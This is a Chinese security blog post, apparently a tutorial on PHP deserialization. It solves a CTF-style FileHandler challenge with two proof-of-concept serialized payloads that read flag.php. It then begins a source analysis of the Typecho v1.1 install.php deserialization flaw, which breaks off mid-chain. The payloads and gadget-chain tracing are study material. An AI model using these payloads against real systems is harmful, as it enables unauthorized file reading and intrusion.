        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">op</span> <span class="token operator">==</span> <span class="token double-quoted-string string">"1"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">op</span> <span class="token operator">==</span> <span class="token double-quoted-string string">"2"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Bad Hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Too long!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Successful!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">else</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> <span class="token variable">$res</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">output</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"[Result]: &lt;br>"</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token variable">$s</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">op</span> <span class="token operator">===</span> <span class="token double-quoted-string string">"2"</span><span class="token punctuation">)</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">op</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"1"</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">32</span> <span class="token operator">&amp;&amp;</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">125</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">&#123;</span><span class="token single-quoted-string string">'str'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>

    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'str'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

<span class="token punctuation">&#125;</span></span></code></pre>

<p>简单分析该题后，发现需要<font color=orange><code>GET</code></font>传递<font color=orange><code>str</code></font>参数，在该参数符合<font color=orange><code>is_valid()</code></font>函数校验后，对<font color=orange><code>str</code></font>反序列化。</p>
<blockquote>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">32</span> <span class="token operator">&amp;&amp;</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">125</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>那么<font color=orange><code>str</code></font>需要符合什么请求呢？在<font color=orange><code>is_valid()</code></font>函数校验中，要求<font color=orange><code>str</code></font>中的所有字符ASCII码需要在32到125之间</p>
</blockquote>
<p>接下来就是构造<font color=orange><code>str</code></font>并利用，在本题中有两个魔术方法存在：构造函数<font color=purple><code>__construct()</code></font>和析构函数<font color=purple><code>__destruct()</code></font>：</p>
<blockquote>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$op</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"1"</span><span class="token punctuation">;</span>
    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"/tmp/tmpfile"</span><span class="token punctuation">;</span>
    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"Hello World!"</span><span class="token punctuation">;</span>
    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">op</span> <span class="token operator">===</span> <span class="token double-quoted-string string">"2"</span><span class="token punctuation">)</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">op</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"1"</span><span class="token punctuation">;</span>
    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">;</span>
    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>在此，可以利用析构函数，在<font color=purple><code>__destruct()</code></font>中，会判断对象的<font color=orange><code>op</code></font>属性是否等于”2”（PHP中的强类型判断，会判断变量的<font color=orange><code>type</code></font>是否也相同），并且进入<font color=orange><code>process()</code></font>中</p>
</blockquote>
<p>再查看<font color=orange><code>process()</code></font>函数：</p>
<blockquote>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">op</span> <span class="token operator">==</span> <span class="token double-quoted-string string">"1"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">op</span> <span class="token operator">==</span> <span class="token double-quoted-string string">"2"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Bad Hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>在该函数中，判断<font color=orange><code>op</code></font>属性是否等于”2”（弱类型判断，并不会判断变量<font color=orange><code>type</code></font>是否相同），若等于，则用<font color=orange><code>read()</code></font>函数读取文件名为<font color=orange><code>filename</code></font>属性值的文件并输出</p>
</blockquote>
<h4 id="2-2-POC"><a href="#2-2-POC" class="headerlink" title="2.2 POC"></a>2.2 POC</h4><p>通过上面分析，整个利用过程就清晰了：</p>
<p>构造字符串<font color=orange><code>str</code></font>绕过<font color=orange><code>is_valid()</code></font>函数的判断，然后设置<font color=orange><code>op</code></font>属性值绕过<font color=purple><code>__destruct()</code></font>中对”2”强类型判断，将<font color=orange><code>filename</code></font>设置为想要读取的文件名</p>
<p>POC1：PHP7.1+ 版本对属性类型不敏感，本地序列化的时候将属性改为 <font color=orange><code>public</code></font>可进行绕过</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">class</span> <span class="token class-name">FileHandler</span><span class="token punctuation">&#123;</span> 
    <span class="token keyword">public</span> <span class="token variable">$op</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"flag.php"</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"hello!"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>  
<span class="token variable">$poc1</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileHandler</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$poc1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//str为: O:11:"FileHandler":3:&#123;s:2:"op";i:2;s:8:"filename";s:8:"flag.php";s:7:"content";s:6:"hello!";&#125;</span>

<span class="token delimiter important">?></span></span></code></pre>

<p>POC2：使用16进制的\00替换空字节，采用大写的S以支持16进制的\00（好像说空格替换空字节也可以，但我没有成功）</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">class</span> <span class="token class-name">FileHandler</span><span class="token punctuation">&#123;</span> 
    <span class="token keyword">protected</span> <span class="token variable">$op</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"flag.php"</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"hello!"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>  
<span class="token variable">$data</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileHandler</span><span class="token punctuation">;</span>
<span class="token variable">$poc2</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$poc2</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">00</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\00'</span><span class="token punctuation">,</span><span class="token variable">$poc2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//由于protected属性序列化后包含空字节，将其替换为可见的"\00"</span>
<span class="token variable">$poc2</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'s'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'S'</span><span class="token punctuation">,</span><span class="token variable">$poc2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$poc2</span><span class="token punctuation">;</span>
<span class="token comment">//str为: O:11:"FileHandler":3:&#123;S:5:"\00*\00op";i:2;S:11:"\00*\00filename";S:8:"flag.php";S:10:"\00*\00content";S:6:"hello!";&#125;</span>

<span class="token delimiter important">?></span></span></code></pre>

<p>最后获得flag：</p>
<p><img src="https://raw.githubusercontent.com/Jmhram/markdown/main/img/20210430094650.png" alt="image-20210430094513449" loading="lazy"></p>
<p><img src="https://raw.githubusercontent.com/Jmhram/markdown/main/img/20210430094643.png" alt="image-20210430094448956" loading="lazy"></p>
<h3 id="0x03-Typecho反序列化漏洞复现"><a href="#0x03-Typecho反序列化漏洞复现" class="headerlink" title="0x03 Typecho反序列化漏洞复现"></a>0x03 Typecho反序列化漏洞复现</h3><h4 id="3-1-漏洞简介"><a href="#3-1-漏洞简介" class="headerlink" title="3.1 漏洞简介"></a>3.1 漏洞简介</h4><p>Typecho在程序安装后不会删除<font color=orange><code>install.php</code></font>，在该页面中存在反序列化漏洞</p>
<p>程序版本：<a href="https://github.com/typecho/typecho/releases">v1.1-15.5.12-beta</a></p>
<h4 id="3-2-源码分析"><a href="#3-2-源码分析" class="headerlink" title="3.2 源码分析"></a>3.2 源码分析</h4><p>在<font color=orange><code>install.php</code></font>的第230行中，找到反序列化相关内容：将get到的<font color=orange><code>__typecho_config</code></font>进行base64解码后，再反序列化，将反序列化的结果放入了<font color=orange><code>Typecho_Db</code></font>类中</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token variable">$config</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span>Typecho_Cookie<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'__typecho_config'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	Typecho_Cookie<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">delete</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'__typecho_config'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$db</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Typecho_Db</span><span class="token punctuation">(</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'adapter'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$config</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'prefix'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addServer</span><span class="token punctuation">(</span><span class="token variable">$config</span><span class="token punctuation">,</span> Typecho_Db<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">READ</span> <span class="token operator">|</span> Typecho_Db<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">WRITE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	Typecho_Db<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span></code></pre>

<p>查看Typecho_Cookie的<font color=orange><code>get()</code></font>函数：从<font color=orange><code>cookie</code></font>或者<font color=orange><code>POST</code></font>参数中获取值，因此，可控的输入源可以从此出发</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$default</span> <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token variable">$key</span> <span class="token operator">=</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$_prefix</span> <span class="token punctuation">.</span> <span class="token variable">$key</span><span class="token punctuation">;</span>
    <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token variable">$default</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$default</span> <span class="token punctuation">:</span> <span class="token variable">$value</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>查看<font color=orange><code>Typecho_Db</code></font>类，其中的魔术方法有<font color=purple><code>__construct()</code></font>：在变量<font color=orange><code>$adapterName</code></font>的拼接中，将该变量作为字符串进行拼接，会触发<font color=purple><code>__toString()</code></font>魔术方法</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$adapterName</span><span class="token punctuation">,</span> <span class="token variable">$prefix</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'typecho_'</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token comment">/** 获取适配器名称 */</span>
    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_adapterName</span> <span class="token operator">=</span> <span class="token variable">$adapterName</span><span class="token punctuation">;</span>

    <span class="token comment">/** 数据库适配器 */</span>
    <span class="token variable">$adapterName</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'Typecho_Db_Adapter_'</span> <span class="token punctuation">.</span> <span class="token variable">$adapterName</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$adapterName</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'isAvailable'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Typecho_Db_Exception</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Adapter <span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$adapterName</span><span class="token punctuation">&#125;</span></span> is not available"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_prefix</span> <span class="token operator">=</span> <span class="token variable">$prefix</span><span class="token punctuation">;</span>

    <span class="token comment">/** 初始化内部变量 */</span>
    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_pool</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_connectedPool</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_config</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">//实例化适配器对象</span>
    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_adapter</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token variable">$adapterName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>查找<font color=purple><code>__toString()</code></font>魔术方法，发现在<font color=orange><code>\var\Typecho\Feed.php</code></font>中：若<font color=orange><code>$item[&#39;author&#39;]</code></font>中不存在<font color=orange><code>screenName</code></font>属性，则会触发item的<font color=purple><code>__get()</code></font>魔术方法</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
    <span class="token variable">$content</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token single-quoted-string string">'&lt;item>'</span> <span class="token punctuation">.</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">EOL</span><span class="token punctuation">;</span>
    <span class="token variable">$content</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token single-quoted-string string">'&lt;title>'</span> <span class="token punctuation">.</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$item</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'title'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'&lt;/title>'</span> <span class="token punctuation">.</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">EOL</span><span class="token punctuation">;</span>
    <span class="token variable">$content</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token single-quoted-string string">'&lt;link>'</span> <span class="token punctuation">.</span> <span class="token variable">$item</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'link'</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'&lt;/link>'</span> <span class="token punctuation">.</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">EOL</span><span class="token punctuation">;</span>
    <span class="token variable">$content</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token single-quoted-string string">'&lt;guid>'</span> <span class="token punctuation">.</span> <span class="token variable">$item</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'link'</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'&lt;/guid>'</span> <span class="token punctuation">.</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">EOL</span><span class="token punctuation">;</span>
